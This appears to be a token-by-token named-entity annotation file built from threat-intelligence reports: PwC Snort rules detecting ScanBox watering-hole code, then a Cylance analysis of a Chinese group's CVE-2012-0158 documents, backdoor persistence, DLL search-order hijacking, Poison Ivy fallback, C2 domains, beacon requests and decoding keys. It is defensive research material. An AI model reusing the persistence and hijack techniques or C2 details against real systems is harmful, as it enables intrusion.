tcp	O
$	O
EXTERNAL_NET	O
any	O
-	O
>	O
$	O
HOME_NET	O
any	O
(	O
msg:"--[PwC	O
CTD	O
]	O
--	O
MultiGroup	O
-	O
ScanBox	O
Watering	O
Hole	O
Content	O
(	O
return	O
(	O
(	O
!	O
a	O
)	O
?	O
'	O
x-	O
'	O
:	O
a	O
)	O
+	O
Math.floor(Math.random	O
(	O
)	O
*	O
99999)\	O
;	O
)	O
"	O
;	O
flow	O
:	O
established	O
,	O
from_server	O
;	O
file_data	O
;	O
content:"return	O
(	O
(	O
!	O
a	O
)	O
?	O
'	O
x-	O
'	O
:	O
a	O
)	O
+	O
Math.floor(Math.random	O
(	O
)	O
*	O
99999)\	O
;	O
"	O
;	O
classtype	O
:	O
trojan	O
-	O
activity	O
;	O
reference	O
:	O
url	O
,	O
pwc.blogs.com	O
/	O
cyber_security_updates/2014/10/scanbox	O
-	O
framework	O
-	O
whos-	O
affected-and-whos-using-it-1.html	O
;	O
metadata	O
:	O
tlp	O
WHITE	O
,	O
author	O
CDD	O
;	O
sid	O
:	O
xxxxxx	O
;	O
rev:2015021901	O
;	O
)	O
alert	O
tcp	O
$	O
EXTERNAL_NET	O
any	O
-	O
>	O
$	O
HOME_NET	O
any	O
(	O
msg:"--[PwC	O
CTD	O
]	O
--	O
MultiGroup	O
-	O
TH3BUG	O
and	O
Non	O
-	O
Targetted	O
Groups	O
Watering	O
Hole	O
Code	O
(	O
Chr(CInt(ns(i	O
)	O
)	O
Xor	O
n	O
)	O
)	O
"	O
;	O
flow	O
:	O
established	O
,	O
from_server	O
;	O
file_data	O
;	O
content:"Chr(CInt(ns(i	O
)	O
)	O
Xor	O
n	O
)	O
"	O
;	O
classtype	O
:	O
trojan	O
-	O
activity	O
;	O
reference	O
:	O
url	O
,	O
pwc.blogs.com	O
/	O
cyber_security_updates/2014/10/scanbox	O
-	O
framework	O
-	O
whos-	O
affected-and-whos-using-it-1.html	O
;	O
metadata	O
:	O
tlp	O
WHITE	O
,	O
author	O
CDD	O
;	O
sid	O
:	O
xxxxxx	O
;	O
rev:2015021901	O
;	O
)	O
Where	O
the	O
site	O
was	O
referenced	O
via	O
phishing	O
as	O
opposed	O
to	O
'	O
Watering	O
Hole	O
'	O
based	O
activity	O
,	O
it	O
has	O
been	O
excluded	O
from	O
the	O
following	O
table	O
.	O
Where	O
we	O
have	O
an	O
assigned	O
cluster	O
,	O
but	O
have	O
not	O
discussed	O
it	O
in	O
this	O
document	O
,	O
we	O
have	O
given	O
'	O
Cluster	O
[	O
Letter	O
]	O
'	O
these	O
are	O
not	O
intended	O
as	O
names	O
for	O
groups	O
.	O
Where	O
we	O
do	O
not	O
have	O
an	O
associated	O
group	O
we	O
have	O
listed	O
'	O
unknown	O
'	O
under	O
this	O
field	O
.	O
Fortinet	O
F	O
-	O
PROT	O
F	O
-	O
Secure	O
f	O
-	O
secure2011	O
IKARUS	O
Immunet	O
iTunes	O
JiangMin	O
Kaspersky_2012	O
Kaspersky_2013	O
Kaspersky_Endpoint_Security_8	O
mcafee_enterprise	O
Mse	O
Norman	O
Norton	O
Nprotect	O
Outpost	O
PC_Tools	O
QuickHeal	O
Rising	O
Rising_firewall	O
sophos	O
SQLServer	O
Sunbelt	O
SUPERAntiSpyware	O
Symantec_Endpoint12	O
symantec	O
-	O
endpoint	O
Trend2013	O
ViRobot4	O
VirusBuster	O
vmware	O
-	O
client	O
vmware	O
-	O
server	O
WinRAR	O
winzip	O
For	O
more	O
in	O
-	O
depth	O
coverage	O
,	O
including	O
full	O
details	O
of	O
the	O
analysis	O
behind	O
this	O
blog	O
as	O
well	O
as	O
additional	O
indicators	O
which	O
can	O
be	O
used	O
to	O
detect	O
similar	O
samples	O
,	O
or	O
if	O
you	O
have	O
any	O
other	O
queries	O
,	O
please	O
give	O
us	O
a	O
shout	O
at	O
threatintelligence@uk.pwc.com	O
.	O
The	O
information	O
contained	O
in	O
this	O
document	O
has	O
been	O
prepared	O
as	O
a	O
matter	O
of	O
interest	O
and	O
for	O
information	O
purposes	O
only	O
,	O
and	O
does	O
not	O
constitute	O
professional	O
advice	O
.	O
You	O
should	O
not	O
act	O
upon	O
the	O
information	O
contained	O
in	O
this	O
email	O
without	O
obtaining	O
specific	O
professional	O
advice	O
.	O
No	O
representation	O
or	O
warranty	O
(	O
express	O
or	O
implied	O
)	O
is	O
given	O
as	O
to	O
the	O
accuracy	O
or	O
completeness	O
of	O
the	O
information	O
contained	O
in	O
this	O
email	O
,	O
and	O
,	O
to	O
the	O
extent	O
permitted	O
by	O
law	O
,	O
PricewaterhouseCoopers	O
LLP	O
,	O
its	O
members	O
,	O
employees	O
and	O
agents	O
do	O
not	O
accept	O
or	O
assume	O
any	O
liability	O
,	O
responsibility	O
or	O
duty	O
of	O
care	O
for	O
any	O
consequences	O
of	O
you	O
or	O
anyone	O
else	O
acting	O
,	O
or	O
refraining	O
to	O
act	O
,	O
in	O
reliance	O
on	O
the	O
information	O
contained	O
in	O
this	O
email	O
or	O
for	O
any	O
decision	O
based	O
on	O
it	O
.	O
May	O
13	O
,	O
2015	O
By	O
Jon	O
Gross(http://blog.cylance.com	O
/	O
author	O
/	O
jon	O
-	O
gross	O
)	O
Share	O
This	O
.	O
Attackers	B-Entity
typically	O
shut	O
down	O
campaigns	O
or	O
halt	O
activity	O
after	O
they	O
are	O
exposed	O
by	O
security	O
researchers	O
,	O
thereby	O
creating	O
the	O
impression	O
they	O
have	O
dropped	O
off	O
the	O
map	O
.	O
This	O
often	O
leads	O
to	O
a	O
false	O
sense	O
of	O
security	O
within	O
the	O
community	O
and	O
perpetuates	O
the	O
idea	O
that	O
public	O
exposure	O
makes	O
us	O
all	O
safer	O
.	O
While	O
the	O
exposed	O
activity	O
is	O
no	O
longer	O
observed	O
,	O
attackers	O
simply	O
continue	O
in	O
the	O
background	O
–	O
evolving	O
or	O
altering	O
their	O
tactics	O
to	O
seamlessly	O
continue	O
operations	O
with	O
increasingly	O
advanced	O
malware	O
.	O
So	O
while	O
potentially	O
making	O
us	O
safer	O
in	O
the	O
short	O
-	O
term	O
,	O
exposure	O
often	O
forces	O
a	O
Darwinian	O
evolution	O
in	O
malware	O
.	O
Several	O
months	O
ago	O
I	O
examined	O
a	O
malware	O
-	O
tainted	O
Word	O
document	O
titled	O
"	O
ISIS_twitter_list.doc	O
.	O
"	O
I	O
did	O
n't	O
think	O
much	O
of	O
it	O
and	O
quickly	O
moved	O
on	O
after	O
a	O
cursory	O
analysis	O
.	O
Yet	O
I	O
recently	O
uncovered	O
evidence	O
that	O
suggests	O
it	O
was	O
the	O
work	O
of	O
a	O
well	O
-	O
known	O
Chinese	O
threat	O
group	O
.	O
This	O
group	O
is	O
known	O
to	O
have	O
targeted	O
U.S.	O
government	O
agencies	O
,	O
defense	O
contractors	O
,	O
aerospace	O
firms	O
and	O
foreign	O
militaries	O
since	O
2009	O
.	O
Until	O
now	O
,	O
it	O
was	O
widely	O
believed	O
the	O
actor	O
's	O
activities	O
had	O
largely	O
subsided	O
in	O
2013	O
,	O
following	O
numerous	O
public	O
disclosures	O
and	O
detailed	O
analyses	O
of	O
their	O
backdoors	O
.	O
Our	O
technical	O
analysis	O
shows	O
the	O
group	O
has	O
remained	O
active	O
.	O
We	O
are	O
releasing	O
this	O
data	O
to	O
help	O
victims	O
identify	O
and	O
remediate	O
the	O
threat	O
.	O
Click	O
here(http://blog.cylance.com	O
/	O
spear	O
-	O
a	O
-	O
threat	O
-	O
actor-	O
resurfaces#mitigation	O
)	O
to	O
get	O
to	O
recommended	O
mitigations	O
,	O
or	O
for	O
all	O
the	O
technical	O
details	O
read	O
on	O
.	O
It	O
all	O
began	O
with	O
the	O
MIME	O
encoded	O
document	O
"	O
ISIS_twitter_list.doc	O
"	O
,	O
which	O
exploited	O
the	O
familiar	O
CVE-2012-	O
0158(http://www.cve.mitre.org	O
/	O
cgi	O
-	O
bin	O
/	O
cvename.cgi?name	O
=	O
CVE-2012	O
-	O
0158	O
)	O
and	O
was	O
first	O
uploaded	O
to	O
Virustotal	O
from	O
a	O
user	O
in	O
India	O
.	O
Other	O
targets	O
identified	O
were	O
predominantly	O
located	O
in	O
Australia	O
,	O
New	O
Zealand	O
,	O
Vietnam	O
and	O
the	O
United	O
States	O
.	O
File	O
Details	O
Name	O
ISIS_twitter_list.doc	O
SHA256	O
6ba1d42c6493b18548e30bd60ca3d07a140d9d1945cf4e2b542e4a6d23913f40	O
File	O
Size	O
146,338	O
bytes	O
The	O
first	O
stage	O
shellcode	O
searches	O
for	O
the	O
marker	O
"	O
GfCv	O
"	O
then	O
checks	O
the	O
next	O
four	O
bytes	O
are	O
"	O
EF	O
FE	O
EC	O
CE	O
"	O
in	O
the	O
document	O
then	O
decodes	O
the	O
second	O
stage	O
shellcode	O
using	O
the	O
four	O
-	O
byte	O
XOR	O
key	O
"	O
0x29F7C592	O
"	O
.	O
This	O
second	O
stage	O
finds	O
and	O
decodes	O
an	O
encoded	O
executable	O
beginning	O
at	O
offset	O
0x33A2	O
.	O
The	O
binary	O
is	O
encoded	O
using	O
a	O
variable	O
4-byte	O
XOR	O
key	O
that	O
is	O
generated	O
by	O
starting	O
with	O
the	O
4-byte	O
key	O
0x7FFEFC00	O
;	O
this	O
XOR	O
key	O
is	O
then	O
permutated	O
every	O
four	O
bytes	O
by	O
rotating	O
the	O
first	O
two	O
bytes	O
of	O
the	O
key	O
by	O
0x1	O
and	O
shifting	O
the	O
bits	O
of	O
the	O
next	O
two	O
bytes	O
right	O
by	O
0x1	O
,	O
so	O
the	O
next	O
4-byte	O
XOR	O
key	O
in	O
the	O
series	O
would	O
be	O
0x3FFF7E00	O
.	O
It	O
includes	O
some	O
logic	O
to	O
exclude	O
XOR'ng	O
any	O
bytes	O
that	O
match	O
0x00000000	O
or	O
the	O
current	O
4-	O
byte	O
XOR	O
key	O
.	O
For	O
the	O
binary	O
mathematically	O
impaired	O
like	O
myself	O
the	O
4-byte	O
keys	O
will	O
eventually	O
repeat	O
in	O
effect	O
creating	O
a	O
256-byte	O
XOR	O
key	O
.	O
The	O
decoded	O
binary	O
will	O
be	O
written	O
to	O
the	O
filesystem	O
as	O
"	O
%	O
APPDATA%\Microsoft\Systemcertificates\Certificates.ocx	O
"	O
.	O
File	O
Details	O
Full	O
File	O
Path	O
%	O
APPDATA%\Microsoft\Systemcertificates\Certificates.ocx	O
SHA256	O
9d838fd9d21778ed9dc02226302b486d70ed13d4b3d914a3b512ea07bf67e165	O
File	O
Size	O
107,008	O
bytes	O
Compile	O
Time	O
2/4/2015	O
8:41:42	O
UTC	O
The	B-Entity
malware	I-Entity
does	O
not	O
execute	O
immediately	O
after	O
successful	O
exploitation	O
and	O
instead	O
just	O
creates	O
a	O
Run	B-Entity
key	I-Entity
in	O
the	O
current	B-Entity
user	I-Entity
's	I-Entity
hive	I-Entity
which	O
will	O
execute	O
the	O
next	O
time	O
the	O
victim	O
user	O
accesses	O
the	O
system	O
.	O
Registry	O
Persistence	O
Key	O
HKCU\Software\Microsoft\Windows\CurrentVersion\Run\Certificates	O
Registry	O
Key	O
Value	O
Rundll32.exe	O
"	O
%	O
APPDATA%\Microsoft\SystemCertificates\Certificates.ocx",Setup	O
The	O
ocx	O
file	O
is	O
actually	O
a	O
DLL	O
and	O
provides	B-Action
the	B-Entity
attacker	I-Entity
the	O
ability	O
to	O
upload	B-Action
,	O
download	O
,	O
enumerate	O
,	O
delete	O
,	O
search	O
,	O
and	O
execute	B-Action
files	B-Entity
as	O
well	O
as	O
list	B-Action
drivers	B-Entity
on	O
the	O
system	O
.	O
The	O
binary	O
is	O
designed	O
to	O
be	O
called	O
from	O
its	O
one	O
exported	O
function	O
,	O
"	O
Setup	O
"	O
;	O
the	O
Run	O
key	O
will	O
ensure	O
that	O
whenever	O
the	O
victim	B-Entity
user	I-Entity
logs	I-Entity
into	I-Entity
the	I-Entity
system	I-Entity
the	O
backdoor	O
will	O
execute	O
.	O
The	O
binary	O
is	O
configured	O
to	O
communicate	B-Action
to	B-Modifier
"	I-Modifier
www.microsoftservices.proxydns.com	B-Entity
"	I-Entity
on	B-Modifier
port	O
80	O
using	O
standard	O
HTTP	B-Entity
POST	I-Entity
and	I-Entity
GET	I-Entity
requests	I-Entity
.	O
The	O
domain	O
at	O
the	O
time	O
of	O
this	O
report	O
resolved	O
to	O
the	O
IP	O
address	O
,	O
"	O
103.229.125.157	O
"	O
.	O
Additionally	O
the	O
dynamic	O
DNS	O
domains	O
"	O
fighthard.mooo.com	O
"	O
and	O
"	O
rampage.freetcp.com	O
"	O
have	O
both	O
historically	O
resolved	O
to	O
this	O
IP	O
address	O
.	O
Example	O
initial	O
beacon	O
request	O
.	O
GET	B-Entity
/login?wd	O
=	O
hvJZkcIvKKupNRlsqI0aN6jZDTYPz6ZS9Q-	O
H5bCXiER37jqqCDzS3wIUulYOjyKHcDomZCD72mAc4fSCoHhJJ1UQliBkraMepzS5J3UUFUH-	O
nofoOgVM02UlCs4LJANIuZH90vM5KH_Ih59DdVRbgQ==	O
HTTP/1.1	O
User	O
-	O
Agent	O
:	O
Mozilla/4.0	O
(	O
compatible	O
;	O
MSIE	O
7.0	O
;	O
Windows	O
NT	O
5.1	O
;	O
Trident/4.0	O
;	O
.NET	O
CLR	O
2.0.50727	O
;	O
.NET	O
CLR	O
3.0.4506.2152	O
;	O
.NET	O
CLR	O
3.5.30729	O
;	O
.NET	O
CLR	O
1.1.4322	O
)	O
Host	O
:	O
www.microsoftservices.proxydns.com	O
Cache	O
-	O
Control	O
:	O
no	O
-	O
cache	O
The	O
above	O
beacon	O
request	O
can	O
be	O
decoded	O
by	O
base64	O
decoding	O
with	O
this	O
alphabet	O
,	O
"	O
ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-	O
_	O
"	O
.	O
Then	O
RC4	O
decrypting	O
the	O
resulting	O
string	O
using	O
the	O
first	O
four	O
bytes	O
of	O
the	O
payload	O
as	O
the	O
decryption	O
key	O
.	O
The	O
following	O
python	O
script	O
will	O
make	O
this	O
easy	O
.	O
from	O
Crypto	O
.	O
Cipher	O
import	O
ARC4	O
Decoding	O
the	O
string	O
will	O
yield	O
the	O
following	O
.	O
Where	O
k	O
:	O
is	O
a	O
unique	O
identifier	O
for	O
the	O
victim	O
,	O
s	O
:	O
is	O
a	O
campaign	O
identifier	O
included	O
in	O
the	O
backdoor	O
,	O
h	O
:	O
is	O
the	O
hostname	O
of	O
the	O
victim	O
computer	O
,	O
u	O
:	O
is	O
the	O
victim	O
user	O
,	O
o	O
:	O
is	O
the	O
operating	O
system	O
and	O
service	O
pack	O
level	O
,	O
and	O
m	O
is	O
the	O
mac	O
address	O
.	O
Based	O
upon	O
some	O
cursory	O
analysis	O
the	B-Entity
backdoor	I-Entity
will	O
look	B-Action
for	O
encrypted	B-Action
commands	B-Entity
within	O
HTML	O
comments	B-Entity
returned	I-Entity
from	I-Entity
the	I-Entity
C2	I-Entity
using	O
the	O
following	O
format	O
:	O
"	O
<	O
!	O
?	O
*	O
$	O
@COMMAND	O
GOES	O
HERE@$	O
*	O
?	O
!	O
>	O
;"however	O
,	O
the	O
C2	O
was	O
not	O
active	O
at	O
the	O
time	O
of	O
analysis	O
so	O
this	O
could	O
not	O
be	O
confirmed	O
.	O
The	O
backdoor	O
may	O
also	O
make	B-Action
requests	B-Entity
to	B-Modifier
the	O
C2	O
over	B-Modifier
HTTP	B-Entity
using	B-Modifier
the	O
following	B-Entity
parameters	I-Entity
in	I-Entity
the	I-Entity
URI	I-Entity
string	I-Entity
"	I-Entity
query?sid=	O
"	O
and	O
"	O
result	O
?	O
sid=	O
"	O
.	O
The	O
PDB	O
path	O
,	O
C:\Codes\Eoehttp\Release\Eoehttp.pdb	O
,	O
was	O
also	O
left	O
in	O
the	O
backdoor	O
although	O
no	O
other	O
instances	O
of	O
this	O
path	O
could	O
be	O
identified	O
.	O
Several	O
additional	O
exploit	O
documents	O
were	O
identified	O
by	O
investigating	O
the	O
domains	O
"	O
fighthard.mooo.com	O
"	O
and	O
"	O
rampage.freetcp.com	O
"	O
.	O
Fighthard.mooo.com	O
additionally	O
resolved	O
to	O
173.224.214.12	O
in	O
February	O
of	O
2014	O
.	O
The	O
following	O
exploit	O
documents	O
were	O
identified	O
to	O
contain	O
a	O
payload	O
which	O
communicated	O
to	O
this	O
domain	O
.	O
Naval	O
Science	O
Curriculum	O
2014.doc	O
8794189aad922f2287a56c5e2405b9fd8affd136286aad7ed893b90cd2b76b9c	O
1.doc	O
c593a844a87b3e40346efd5d314c55c5094d5bf191f9bb1aeec8078f6d07c0cd	O
Republic	O
Day	O
speech	O
27	O
Jan	O
2014.doc	O
3219767408bba3fa41b9ab5f964531cf608fb0288684748d6ac0b50cf108c911	O
Rampage.freetcp.com	O
still	O
resolves	O
to	O
103.229.125.157	O
as	O
of	O
4/2/2015	O
Let	O
's	O
go	O
ahead	O
and	O
take	O
a	O
look	O
further	O
into	O
one	O
of	O
the	O
other	O
expoit	O
documents	O
,	O
8794189aad922f2287a56c5e2405b9fd8affd136286aad7ed893b90cd2b76b9c	O
.	O
SHA256	O
8794189aad922f2287a56c5e2405b9fd8affd136286aad7ed893b90cd2b76b9c	O
Name	O
Naval	O
Science	O
Curriculum	O
2014.doc	O
File	O
Size	O
459,087	O
The	O
document	O
exploits	O
old	O
faithful	O
,	O
CVE-2012	O
-	O
0158(http://www.cve.mitre.org	O
/	O
cgi	O
-	O
bin	O
/	O
cvename.cgi	O
?	O
name	O
=	O
CVE-2012	O
-	O
0158	O
)	O
,	O
but	O
instead	O
of	O
using	O
a	O
MIME	O
encoded	O
document	O
this	O
file	O
was	O
just	O
a	O
plain	O
RTX	O
document	O
.	O
Yes	O
that	O
's	O
not	O
a	O
misspelling	O
Word	O
is	O
happy	O
to	O
open	O
this	O
RTF	O
format	O
as	O
well	O
.	O
So	O
for	O
anyone	O
exploring	O
and	O
hunting	O
RTF	O
documents	O
you	O
may	O
also	O
want	O
to	O
start	O
looking	O
for	O
the	O
"	O
{	O
\rtx	O
"	O
header	O
.	O
We	O
'll	O
skip	O
the	O
shellcode	O
analysis	O
for	O
now	O
and	O
go	O
directly	O
to	O
the	O
binary	O
which	O
is	O
stored	O
beginning	O
at	O
offset	O
0x1BC27	O
as	O
an	O
ASCII	O
hex	O
-	O
encoded	O
,	O
xor	O
-	O
encoded	O
binary	O
.	O
It	O
can	O
be	O
decoded	O
using	O
the	O
XOR	O
key	O
"	O
0xBF	O
"	O
.	O
Upon	O
successful	O
exploitation	O
the	O
decoded	O
binary	O
will	O
be	O
written	O
first	O
to	O
%	O
TEMP%\dw20.EXEthen	O
copied	O
to	O
%	O
WINDIR%\msascm32.drv	O
.	O
No	O
other	O
changes	O
are	O
made	O
to	O
the	O
system	O
.	O
File	O
Details	O
Full	O
File	O
Path	O
:	O
%	O
WINDIR%\msacm32.drv	O
SHA256	O
:	O
67bd81f4c5e129d19ae71077be8b68dc60e16c19019b2c64cdcedca1f43f0ae3	O
File	O
Size	O
:	O
108,544	O
Bytes	O
Compile	O
Time	O
:	O
9/26/2013	O
01:46:23	O
UTC	O
I	O
'm	O
always	O
curious	O
when	O
no	O
registry	O
changes	O
are	O
made	O
in	O
the	O
exploitation	O
process	O
.	O
At	O
first	O
the	O
backdoor	O
failed	O
to	O
load	B-Action
or	O
really	O
do	O
anything	O
in	O
my	O
VM	O
until	O
I	O
read	O
what	O
the	O
"	O
msascm32.drv	O
"	O
file	O
does	O
.	O
Looking	O
at	O
the	O
original	O
file	O
's	O
(	O
%	O
WINDIR%\system32\msacm32.drv	O
)	O
imported	O
functions	O
,	O
it	O
's	O
clear	O
the	O
DLL	O
is	O
responsible	O
for	O
some	O
type	O
of	O
audio	O
processing	O
and/or	O
playback	O
.	O
A	O
quick	O
search	O
on	O
the	O
internet	O
confirmed	O
this	O
so	O
I	O
added	O
a	O
soundcard	O
to	O
my	O
VM	O
.	O
On	B-Modifier
reboot	B-Entity
explorer.exe	I-Entity
was	O
now	O
happy	O
to	O
load	O
the	O
backdoor	O
and	O
get	O
down	O
to	O
business	O
;	O
this	O
technique	O
is	O
known	O
as	O
dll	O
search	O
order	O
hijacking	O
or	O
binary	O
planting	O
.	O
Interestingly	O
the	B-Entity
backdoor	I-Entity
will	O
also	O
load	O
the	O
legitimate	B-Entity
system32\msacm32.drv	I-Entity
file	I-Entity
resolve	I-Entity
functions	O
and	O
pass	O
calls	O
to	O
it	O
so	O
it	O
does	O
n't	O
break	O
audio	O
playback	O
on	O
the	O
victim	O
system	O
.	O
The	O
backdoor	O
contains	O
identical	O
exports	O
as	O
well	O
as	O
an	O
additional	B-Entity
dummy	I-Entity
function	I-Entity
from	I-Entity
the	I-Entity
legitimate	I-Entity
msacm32.drvcalled	I-Entity
"	I-Entity
StartWork	I-Entity
"	I-Entity
which	O
can	O
be	O
used	O
to	O
reliably	O
identify	O
similar	O
samples	O
.	O
The	O
backdoor	B-Entity
routine	I-Entity
exists	I-Entity
inside	O
the	O
DllMain	O
function	O
so	O
when	O
explorer.exeloads	O
the	O
backdoor	O
via	O
LoadLibrary	O
it	O
will	O
begin	O
spawning	O
malicious	O
threads	O
.	O
A	O
PDB	O
path	O
was	O
also	O
left	O
in	O
this	O
binary	O
C:\Users\cmd\Desktop\msacm32\Release\msacm32.pdb	O
;	O
A	O
quick	O
google	O
search	O
will	O
lead	O
you	O
to	O
a	O
YARA	O
rule	O
written	O
by	O
Patrick	O
Olsen	O
and	O
the	O
very	O
similar	O
sample	O
869fa4dfdbabfabe87d334f85ddda234	O
which	O
communicates	O
to	O
www.micro1.zyns.com	O
on	O
TCP	O
port	O
80	O
.	O
The	O
two	O
files	O
also	O
have	O
an	O
identical	O
compilation	O
time	O
,	O
which	O
suggests	O
the	O
backdoor	O
is	O
probably	O
not	O
recompiled	O
very	O
often	O
and	O
instead	O
the	O
attacker	O
simply	O
updates	O
the	O
callback	O
configuration	O
information	O
.	O
The	O
backdoor	O
interestingly	O
contains	O
the	O
well	O
known	O
Poison	O
Ivy	O
RAT	O
shellcode	O
as	O
well	O
as	O
its	O
own	O
custom	O
backdoor	O
.	O
It	O
will	O
first	O
attempt	O
to	O
communicate	O
to	O
fighthard.mooo.com	O
using	O
the	O
poison	O
ivy	O
binary	O
protocol	O
with	O
the	O
default	O
connection	O
password	O
of	O
"	O
admin	O
"	O
.	O
The	O
Poison	O
Ivy	O
shellcode	O
is	O
encrypted	O
using	O
a	O
custom	O
cipher	O
with	O
the	O
key	O
"	O
Tiger324	O
{	O
"	O
beginning	O
at	O
offset	O
0xFA5	O
and	O
ending	O
at	O
0x159E.	O
If	O
this	O
initial	O
connection	O
fails	O
it	O
will	O
revert	O
to	O
the	O
secondary	O
backdoor	O
,	O
which	O
utilizes	O
HTTP	O
GET	O
and	O
POST	O
requests	O
somewhat	O
similar	O
to	O
the	O
ones	O
described	O
above	O
to	O
the	O
internal	O
IP	O
address	O
"	O
192.168.2.26	O
"	O
.	O
This	O
suggested	O
the	O
attacker	O
had	O
already	O
compromised	O
other	O
systems	O
in	O
the	O
environment	O
and	O
was	O
using	O
an	O
internal	O
C2	O
mechanism	O
for	O
a	O
fallback	O
.	O
Example	O
Internal	O
Beacon	O
.	O
GET	B-Entity
/login.asp	O
?	O
p*hWe8J5pF*k5xv5XeUhIJbKZQfySZRv1NcwhQi2ZHKKvGBC8EjiadbWLoUcgUxJyZElD7AY0DCWmzbIa9IX	O
EJ7OZkvwBZVx1JsrhQ==	O
HTTP/1.1	O
User	O
-	O
Agent	O
:	O
Mozilla/4.0	O
(	O
compatible	O
;	O
MSIE	O
8.0	O
;	O
Win32	O
)	O
Host	O
:	O
192.168.2.26	O
Requests	O
may	O
also	O
be	O
made	O
to	O
the	O
following	O
pages	O
:	O
"	O
check.asp	O
"	O
,	O
"	O
result.asp	O
"	O
,	O
and	O
"	O
upload.asp	O
"	O
.	O
The	O
request	O
structure	O
is	O
slightly	O
different	O
in	O
that	O
it	O
uses	O
the	O
base64	O
alphabet	O
"	O
ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789	O
+	O
*	O
"	O
.	O
The	O
resulting	O
request	O
can	O
be	O
decoded	O
further	O
by	O
using	O
the	O
first	O
16	O
bytes	O
of	O
the	O
result	O
as	O
an	O
XOR	O
key	O
to	O
decode	O
the	O
rest	O
of	O
the	O
payload	O
.	O
It	O
also	O
uses	O
a	O
static	O
User	O
-	O
Agent	O
string	O
of	O
"	O
Mozilla/4.0	O
(	O
compatible	O
;	O
MSIE	O
8.0	O
;	O
Win32	O
)	O
"	O
for	O
each	O
request	O
.	O
The	O
following	O
script	O
simplifies	O
this	O
process	O
.	O
The	O
request	O
decodes	O
to	O
"	O
123|000000+|USER	O
-	O
D6921F6215|Administrator|-1676096002|1.0|0|	O
"	O
,	O
where	O
values	O
are	O
separated	O
by	O
the	O
delimiter	O
"	O
|	O
"	O
.	O
"	O
123	O
"	O
is	O
a	O
campaign	O
identifier	O
hard	O
coded	O
into	O
the	O
backdoor	O
.	O
I	O
do	O
n't	O
know	O
what	O
"	O
000000	O
+	O
"	O
is	O
but	O
it	O
's	O
also	O
a	O
hard	O
coded	O
value	O
;	O
my	O
best	O
guess	O
is	O
it	O
's	O
to	O
modify	O
the	O
timezone	O
of	O
the	O
timestamp	O
.	O
"	O
USER	O
-	O
D6921F6215	O
"	O
is	O
the	O
hostname	O
of	O
the	O
victim	O
,	O
"	O
Administrator	O
"	O
is	O
the	O
victim	O
user	O
,	O
"	O
1676096002	O
"	O
is	O
the	O
current	O
Date	O
/	O
Time	O
in	O
decimal	O
,	O
and	O
"	O
1.0	O
"	O
is	O
a	O
version	O
number	O
also	O
stored	O
in	O
the	O
backdoor	O
.	O
The	O
16-byte	O
XOR	O
key	O
will	O
be	O
randomly	O
generated	O
per	O
each	O
request	O
.	O
Results	O
from	O
commands	O
will	O
be	O
sent	O
back	O
encoded	O
to	O
the	O
server	O
to	O
the	O
"	O
result.asp	O
"	O
page	O
.	O
The	O
backdoor	O
will	O
accept	O
the	O
following	O
commands	O
.	O
Commands	O
with	O
a	O
?	O
appear	O
to	O
take	O
an	O
additional	O
parameter	O
while	O
files	O
that	O
end	O
in	O
-	O
require	O
a	O
full	O
file	O
path	O
.	O
The	O
backdoor	O
is	O
also	O
capable	O
of	O
elevating	O
its	O
privileges	O
on	O
win7	O
and	O
above	O
using	O
a	O
method	O
similar	O
to	O
the	O
one	O
described	O
here	O
:	O
http://www.pretentiousname.com/misc/win7_uac_whitelist2.html	O
.	O
I	O
thought	O
it	O
was	O
interesting	O
the	O
backdoor	O
used	O
a	O
secondary	O
backup	O
backdoor	O
in	O
addition	O
to	O
its	O
primary	O
payload	O
.	O
The	O
first	O
communicated	O
directly	O
outside	O
the	O
network	O
using	O
a	O
well	O
known	O
RAT	O
protocol	O
and	O
if	O
that	O
failed	O
the	O
secondary	O
much	O
stealthier	O
backdoor	O
communicated	O
to	O
an	O
internal	O
C2	O
address	O
using	O
it	O
's	O
own	O
custom	O
encoded	O
HTTP	O
based	O
protocol	O
.	O
The	O
use	O
of	O
a	O
relatively	O
undisclosed	O
DLL	O
search	O
order	O
hijack	O
also	O
made	O
this	O
sample	O
unique	O
.	O
Detection	O
rates	O
for	O
this	O
binary	O
seem	O
to	O
be	O
pretty	O
good	O
right	O
now	O
39/57	O
;	O
however	O
,	O
at	O
the	O
time	O
it	O
was	O
first	O
used	O
in	O
late	O
January	O
2014	O
detection	O
rates	O
were	O
much	O
poorer	O
.	O
Other	O
samples	O
from	O
the	O
identified	O
exploit	O
documents	O
were	O
similar	O
to	O
the	O
one	O
described	O
above	O
with	O
different	O
network	O
callbacks	O
.	O
And	O
now	O
to	O
tie	O
all	O
this	O
back	O
to	O
the	O
"	O
well	O
-	O
known	O
"	O
threat	O
group	O
.	O
The	O
"	O
173.224.214.12	O
"	O
IP	O
address	O
that	O
"	O
fighthard.mooo.com	O
"	O
previously	O
resolved	O
to	O
also	O
historically	O
had	O
two	O
other	O
domains	O
point	O
to	O
it	O
"	O
queenberry.www1.biz	O
"	O
and	O
"	O
word.crabdance.com	O
"	O
.	O
"	O
word.crabdance.com	O
"	O
previously	O
resolved	O
to	O
"	O
64.71.162.70	O
"	O
on	O
September	O
8	O
,	O
2012	O
and	O
108.171.246.140	O
on	O
February	O
19	O
,	O
2014	O
.	O
The	O
"	O
64.71.162.70	O
"	O
address	O
and	O
the	O
associated	O
domain	O
"	O
www.ollay011.zyns.com	O
"	O
are	O
rather	O
infamous	O
and	O
the	O
first	O
mention	O
of	O
it	O
I	O
could	O
find	O
is	O
in	O
this	O
shadowserver	O
post	O
:	O
http://blog.shadowserver.org/2012/04/16/beware	O
-	O
of	O
-	O
what	O
-	O
you-	O
download	O
-	O
recent	O
-	O
purported	O
-	O
ceiec	O
-	O
document	O
-	O
dump	O
-	O
booby	O
-	O
trapped/	O
related	O
to	O
exploit	O
documents	O
identified	O
in	O
a	O
data	O
dump	O
from	O
Hardcore	O
Charlie	O
.	O
If	O
you	O
follow	O
the	O
rabbit	O
hole	O
deep	O
enough	O
you	O
can	O
eventually	O
trace	O
samples	O
via	O
domain	O
and	O
IP	O
address	O
crossover	O
back	O
to	O
the	O
FBI	O
flash	O
#	O
A-000009-MW	O
from	O
mid	O
2013	O
.	O
Additional	O
domains	O
and	O
IP	O
addresses	O
related	O
to	O
this	O
group	O
are	O
included	O
in	O
the	O
appendix	O
.	O
While	O
defending	O
against	O
the	O
constant	O
stream	O
of	O
new	O
malware	O
from	O
advanced	O
threat	O
groups	O
may	O
be	O
difficult	O
,	O
organizations	O
can	O
take	O
some	O
relatively	O
easy	O
